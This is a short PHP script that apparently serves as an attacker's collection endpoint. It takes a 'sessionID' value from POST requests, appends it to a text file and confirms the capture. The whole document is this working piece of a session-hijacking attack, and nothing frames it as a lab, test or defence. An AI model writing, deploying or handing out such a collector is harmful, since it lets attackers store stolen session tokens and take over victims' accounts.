<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $sessionID = $_POST['sessionID'];
    // Save the session ID to a file or database
    file_put_contents('session_ids.txt', $sessionID . PHP_EOL, FILE_APPEND);
    echo 'Session ID captured successfully.';
}
?>